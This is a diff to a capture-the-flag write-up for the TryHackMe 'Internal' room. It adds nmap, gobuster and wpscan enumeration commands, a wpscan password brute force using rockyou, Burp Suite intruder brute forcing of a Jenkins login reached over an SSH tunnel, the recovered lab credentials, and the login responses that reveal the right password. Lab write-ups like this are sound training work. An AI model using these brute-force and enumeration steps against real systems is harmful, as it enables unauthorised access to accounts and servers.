@@ -25,7 +25,9 @@ Only the assigned target IP is in scope.
 
 # Start enumeration with NMAP
 ```
-└─$ nmap -Pn -sV -sC THM_Target                     
+set hosts file to resolve ip to internal.thm becomes issue later when browsing.
+
+└─$ nmap -Pn -sV -sC internal.thm                     
 ...
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -43,12 +45,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 - GoBuster and feroxbuster both done ferox buster far more detailed but gobuster summed it up better more concisely, more scans on wp, it was not necessary to go in more detail here:
 ```
-└─$ sudo gobuster dir -u "http://THM_Target:80" -w /usr/share/wordlists/dirb/common.txt -t 10 --timeout 10s
+└─$ sudo gobuster dir -u "http://internal.thm:80" -w /usr/share/wordlists/dirb/common.txt -t 10 --timeout 10s
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://THM_Target:80
+[+] Url:                     http://internal.thm:80
 [+] Method:                  GET
 [+] Threads:                 10
 [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
@@ -61,18 +63,19 @@ Starting gobuster in directory enumeration mode
 /.hta                 (Status: 403) [Size: 277]
 /.htaccess            (Status: 403) [Size: 277]
 /.htpasswd            (Status: 403) [Size: 277]
-/blog                 (Status: 301) [Size: 311] [--> http://THM_Target/blog/]                                                                           
+/blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]                                                                           
 /index.html           (Status: 200) [Size: 10918]
-/javascript           (Status: 301) [Size: 317] [--> http://THM_Target/javascript/]                                                                     
-/phpmyadmin           (Status: 301) [Size: 317] [--> http://THM_Target/phpmyadmin/]                                                                     
+/javascript           (Status: 301) [Size: 317] [--> http://internal.thm/javascript/]                                                                     
+/phpmyadmin           (Status: 301) [Size: 317] [--> http://internal.thm/phpmyadmin/]                                                                     
 /server-status        (Status: 403) [Size: 277]
-/wordpress            (Status: 301) [Size: 316] [--> http://THM_Target/wordpress/]
+/wordpress            (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/]
 Progress: 4613 / 4613 (100.00%)
 ===============================================================              
 ```
 On closer inspection with browser there is the internal.thm/blog page with link to login taking us to wp-admin login, and a phpmyadmin login page. A closer look with WPSCAN using:
 ```
- wpscan --url http://THM_Target:80/blog --enumerate --passwords /usr/share/wordlists/rockyou.txt --output wpscan_enumerated.txt
+# Assuming api key installed otherwise add with --api-token YOUR_API_KEY
+wpscan --url http://internal.thm:80/blog/ --enumerate u,at,tt,ap --random_user-agent --passwords /location/of/rockyou.txt --output wpscan_enumerated.txt 
 ```
 Main findings are the username and password for admin account.
 
@@ -246,9 +249,52 @@ YOUR_IP:8080  →  THM_TargetP_IP (SSH server as aubreanna)  →  172.17.0.2:808
 
 This creates a listener on YOUR_IP 127.0.0.1:8080 forwards traffic via encrypted SSH connection to the 172.17.0.2:8080 much the same way used to connect VNC connection via secure SSH connection. To view the website just access 127.0.0.1:8080 in browser not to connect to the target 172.17.0.2:8080. 
 
+Note: default port for burpe suite is 8080 so cant use it on that port if connection to website configured for that port as well. Create another foxy proxy setting for port 8081 and configure listener on burpe suite to (add another) 8081 lookback address. 
+
+Then just send request to intruder and use a sniper attack if a password is known or cluster bomb to work through all possible combinations or username and password payloads.
+
 This gives us the jenkins site similar to ALFRED CTF. A common user name was Admin I started with that with a brute force attack.
 So I used a Burpe Suite in similar way.
 End up with username: admin password:spongebob
+
+
+All requests received 302, but in the response Set-Cookie changes when a successful password is used, and keeps its after but gains the failed Set-Cookie as well.
+```
+# Before success password entered
+
+HTTP/1.1 302 Found
+Date: Wed, 20 May 2026 18:19:50 GMT
+X-Content-Type-Options: nosniff
+Set-Cookie: ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE=; Path=/; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; HttpOnly
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Location: http://127.0.0.1:9090/loginError
+Content-Length: 0
+Server: Jetty(9.4.30.v20200611)
+
+# Success password entered
+
+HTTP/1.1 302 Found
+Date: Wed, 20 May 2026 18:19:51 GMT
+X-Content-Type-Options: nosniff
+Set-Cookie: JSESSIONID.2520d107=node0gzn5vkhao3pcdnina2adfvbb11.node0; Path=/; HttpOnly
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Location: http://127.0.0.1:9090/
+Content-Length: 0
+Server: Jetty(9.4.30.v20200611)
+
+# Failed attempts after password keep the set-cookie and gain same one as earlier failed attempts
+
+HTTP/1.1 302 Found
+Date: Wed, 20 May 2026 18:19:51 GMT
+X-Content-Type-Options: nosniff
+Set-Cookie: JSESSIONID.2520d107=node08cfshb5hiw4n1v0q1kuuu86oe12.node0; Path=/; HttpOnly
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Set-Cookie: ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE=; Path=/; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; HttpOnly
+Location: http://127.0.0.1:9090/loginError
+Content-Length: 0
+Server: Jetty(9.4.30.v20200611)
+```
+
 
 - Then accessing the jenkins login with these credentials
 - Select "Manage Jenkins" then scroll down and use "Script Console"
